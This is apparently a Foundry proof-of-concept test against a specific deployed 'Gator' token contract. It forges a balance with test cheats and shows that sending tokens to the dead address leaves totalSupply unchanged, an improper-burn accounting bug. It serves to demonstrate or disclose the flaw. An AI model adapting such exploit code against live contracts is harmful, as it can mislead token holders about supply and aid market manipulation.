// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IGatorToken {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferTaxRate() external view returns (uint16);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    IGatorToken gator;
    address constant TARGET = 0x55Da3b152F48378A42D091be1eef2af37964BE45;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        gator = IGatorToken(TARGET);
        deal(TARGET, attacker, 1000000 * 1e18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Calculate storage slot for _balances[attacker] - mapping is at slot 0
        bytes32 balanceSlot = keccak256(abi.encode(attacker, uint256(0)));
        uint256 initialBalance = 1000000 * 1e18;
        vm.store(TARGET, balanceSlot, bytes32(initialBalance));

        uint256 initialSupply = gator.totalSupply();
        console.log("Initial totalSupply:", initialSupply);
        console.log("Initial attacker balance:", gator.balanceOf(attacker));

        uint256 burnAmount = 100000 * 1e18;
        address BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;

        // Transfer tokens to burn address - this should decrease totalSupply but doesn't due to bug
        gator.transfer(BURN_ADDRESS, burnAmount);

        uint256 finalSupply = gator.totalSupply();
        console.log("Final totalSupply:", finalSupply);
        console.log("Tokens 'burned':", burnAmount);

        // The vulnerability: totalSupply should have decreased but didn't
        assertEq(initialSupply, finalSupply, "totalSupply should remain unchanged after improper burn");

        // Verify tokens actually left attacker's balance (transfer worked)
        assertEq(gator.balanceOf(attacker), initialBalance - burnAmount, "Attacker balance should decrease");

        // Verify tokens are at burn address
        assertEq(gator.balanceOf(BURN_ADDRESS), burnAmount, "Burn address should have the tokens");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

